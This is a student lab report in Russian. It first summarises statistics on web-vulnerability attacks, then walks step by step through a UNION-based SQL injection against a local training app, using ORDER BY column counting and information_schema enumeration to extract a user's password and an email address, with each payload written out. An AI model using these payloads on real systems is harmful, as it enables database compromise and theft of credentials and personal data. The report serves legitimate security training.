Отчет по лабораторной работе: Web Security & SQL Injection

Часть I. Исследовательский отчет по веб-уязвимостям

Цель

Собрать статистику по доле атак через веб-уязвимости и их распределению.

Доля успешных атак через веб-уязвимости

Согласно глобальному отчету Verizon Data Breach Investigations Report (DBIR), веб-приложения стали основным (наиболее часто эксплуатируемым) вектором атак, обогнав фишинг и человеческий фактор.

По свежим данным отечественной компании BI.ZONE WAF (отчет за апрель 2025 г.), только за зимний период 2024/2025 было выявлено более 4000 новых уязвимостей в веб-приложениях. Из них более трети представляют высокую или критическую опасность. В результате успешных атак через веб-уязвимости в 20% случаев происходит кража пользовательских данных, а в 12% — злоумышленники получают прямой доступ к базам данных.

Распределение по конкретным уязвимостям

Основываясь на отчетах Edgescan (Vulnerability Statistics Report 2024) и WPScan, распределение наиболее массовых и критичных веб-уязвимостей выглядит следующим образом:

  • Cross-Site Scripting (XSS) — самая массовая уязвимость (около 53% от всех раскрытых веб-уязвимостей)
  • Cross-Site Request Forgery (CSRF) — занимает второе место (около 19.8%)
  • Нарушения авторизации (Broken Access Control) — около 8.1%
  • SQL Injection (SQLi) — занимает 4-е место по частоте нахождения, но 1-е место по критичности. Среди всех критических уязвимостей доля SQLi составляет 19.47%, так как этот вектор напрямую ведет к компрометации БД
  • Remote Code Execution (RCE) — встречается реже, но несет максимальный импакт (по статистике BI.ZONE, рост RCE составил 100% за последний год)

Источники

  • Verizon DBIR 2023
  • Edgescan 2024 Vulnerability Statistics Report
  • Отчеты об угрозах BI.ZONE WAF (2025)
  • WPScan 2023 Website Threat Report

Часть II. Практическая эксплуатация SQL-инъекции

Цели

  • Узнать пароль пользователя с ником Volk2 (2 балла)
  • Узнать почту пользователя с ником Vinni-pukh (4 балла)

Ход выполнения и рассуждения

Шаг 1. Разведка и поиск уязвимого параметра

Сначала я попробовал просто прописать логины в адресной строке в виде пути (например, /task/Volk2 или /task/Vinni-pukh), но это не дало результата — сервер либо выдавал ошибку, либо игнорировал ввод.

Поискав информацию, я выяснил, что параметры к базе данных часто передаются через GET-запросы в формате ?id=. Я решил просто перебрать значения параметра id от 1 до 10.

Успешные запросы при переборе:

  • http://localhost:8080/task/?id=4 — Вывод: Ваш id:4 | Ваш логин:Vinni-pukh
  • http://localhost:8080/task/?id=9 — Вывод: Ваш id:9 | Ваш логин:Volk2

Отлично, мы нашли ID нужных нам пользователей.

Шаг 2. Определение количества колонок

Чтобы использовать UNION SELECT, нужно узнать, сколько колонок возвращает оригинальный SQL-запрос под капотом. Для этого я использовал ORDER BY и символ %23 (это URL-кодированный # для комментирования остатка запроса, чтобы не было синтаксической ошибки).

  • http://localhost:8080/task/?id=4 ORDER BY 2%23 — страница отрендерилась нормально
  • http://localhost:8080/task/?id=4 ORDER BY 3%23 — всё отлично
  • http://localhost:8080/task/?id=4 ORDER BY 4%23 — сервер вернул ошибку

Вывод: Сортировка по 4-й колонке ломает запрос, значит, в таблице ровно 3 колонки.

Шаг 3. Поиск уязвимой колонки для вывода

Теперь нужно понять, данные из какой колонки отображаются на экране (отдаются сервером нам в браузер). Передаем заведомо несуществующий id=-1, чтобы скрыть легитимный вывод и показать только результаты нашего внедренного UNION SELECT.

Запрос:

http://localhost:8080/task/?id=-1' UNION SELECT 1,2,3%23
Результат:
Ваш id:1
Ваш логин:2

Вывод: На экране отображается вторая колонка (там где цифра "2"). Значит, именно в неё мы и будем помещать наши запросы к БД.

Шаг 4. Исследование структуры БД

Прежде чем искать пароли, нужно узнать, какие таблицы вообще есть в базе. Обращаемся к служебной таблице information_schema.tables.

Запрос:

http://localhost:8080/task/?id=-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()%23
Результат:
Ваш логин: emails,users

Вывод: В текущей базе данных есть две таблицы: emails и users.

Шаг 5. Получение пароля (Задание 1)

Очевидно, что пароли лежат в таблице users. Делаем инъекцию для выборки пароля по известному нам юзернейму Volk2.

Запрос:

http://localhost:8080/task/?id=-1' UNION SELECT 1, password, 3 FROM users WHERE username='Volk2'%23
Результат:
Ваш логин: Wa spoiuuuuu

✅ Ответ на задание 1: Пароль пользователя Volk2 — Wa spoiuuuuu

Шаг 6. Получение почты (Задание 2)

Сначала я попытался достать почту по аналогии с паролем прямо из таблицы users.

Неуспешный запрос:

http://localhost:8080/task/?id=-1' UNION SELECT 1, email, 3 FROM users WHERE username='Vinni-pukh'%23
Результат: Ошибка Unknown column 'email' in 'field list'

Рассуждение: Раз в users почты нет, значит, она хранится в отдельной таблице emails (которую мы нашли на 4 шаге). Нужно узнать структуру этой таблицы.

Запрос структуры таблицы emails:

http://localhost:8080/task/?id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='emails'%23
Результат:
Ваш логин: id,email_id

Теперь, зная названия колонок (id и email_id), и помня из самого первого шага, что id для Vinni-pukh равен 4, делаем финальный запрос.

Успешный запрос:

http://localhost:8080/task/?id=-1' UNION SELECT 1, email_id, 3 FROM emails WHERE id='4'%23
Результат:
Ваш логин: honey_lover@otus-lab.com

✅ Ответ на задание 2: Почта пользователя Vinni-pukh — honey_lover@otus-lab.com
